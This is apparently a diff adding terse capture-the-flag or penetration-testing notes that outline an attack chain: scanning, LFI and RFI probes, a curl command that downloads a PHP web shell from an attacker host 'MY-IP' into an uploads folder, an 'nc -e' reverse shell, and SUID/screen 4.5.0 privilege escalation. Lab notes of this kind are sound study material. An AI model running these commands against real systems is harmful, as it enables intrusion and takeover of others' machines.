@@ -1,0 +1,11 @@
+nmap
+gobuster
+curl file://  <-- LFI
+curl http://MY-IP  <-- RFI
+curl -o uploads/shell.php http://MY-IP/shell.php
+RCE
+revese shell (nc -e)
+suid binary
+screen 4.5.0
+searchsploit
+follow bash code manually
